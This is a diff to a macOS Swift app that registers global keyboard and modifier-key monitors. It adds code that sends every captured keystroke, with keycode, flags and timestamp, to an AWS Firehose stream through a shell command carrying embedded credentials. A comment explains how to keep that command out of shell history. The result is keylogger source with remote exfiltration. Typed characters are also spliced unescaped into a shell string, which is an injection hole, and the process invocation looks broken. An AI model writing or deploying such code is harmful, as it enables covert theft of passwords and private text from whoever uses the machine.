@@ -8,7 +8,6 @@
 
 import Cocoa
 
-
 class ViewController: NSViewController {
     var keyMonitor: Any?
     var flagMonitor: Any?
@@ -21,27 +20,28 @@ class ViewController: NSViewController {
         if !self.isLogging {
             self.keyMonitor = NSEvent.addGlobalMonitorForEvents(matching: [.keyDown]) { (event) in
                 self.logs.textStorage?.append(NSAttributedString(string: "logged: \(event.characters ?? "unknown") at time \(event.timestamp)) with keycode \(event.keyCode)\n"))
-                print(event)
+                self.fireHosePutRecord(flags: event.modifierFlags.rawValue, keyCode: event.keyCode, char: event.characters ?? "NULL", time: Date().timeIntervalSince1970)
             }
-            
             self.flagMonitor = NSEvent.addGlobalMonitorForEvents(matching: [.flagsChanged]) { (event) in
                 self.logs.textStorage?.append(NSAttributedString(string: "logged flagchange to \(event.modifierFlags.rawValue) at time \(event.timestamp)) with keycode \(event.keyCode)\n"))
-                print(event)
+                self.fireHosePutRecord(flags: event.modifierFlags.rawValue, keyCode: event.keyCode, char: event.characters ?? "NULL", time: Date().timeIntervalSince1970)
             }
+            
             self.isLogging = true
         } else {
             NSEvent.removeMonitor(keyMonitor as Any)
             NSEvent.removeMonitor(flagMonitor as Any)
             self.isLogging = false
         }
-
     }
     
-    func fireHosePutRecord(data:String){
+    func fireHosePutRecord(flags:UInt, keyCode: UInt16, char: String, time: Double){
+        let jsonString:String = "{\"Data\":\"{\\\"flags\\\":\(flags), \\\"keyCode\\\":\(keyCode), \\\"char\\\":\\\"\(char)\\\", \\\"time\\\":\(time)}\"}"
         let task = Process()
-        task.launchPath = "."
+        task.launchPath = "/usr/bin/env/"
         //keep the space before the access key, it stops the command from showing up in the command history
-        task.arguments = ["  AWS_ACCESS_KEY=\(key) AWS_SECRET_ACCESS_KEY=\(secret)","aws", "firehose", "put-record", "--delivery-stream-name \(stream)", "--record", "Data=\(data)"]
+        task.arguments = ["  AWS_ACCESS_KEY=\(key) AWS_SECRET_ACCESS_KEY=\(secret) aws firehose put-record --delivery-stream-name \(stream) --record '\(jsonString)'"]
+        print(task)
         task.launch()
     }
     
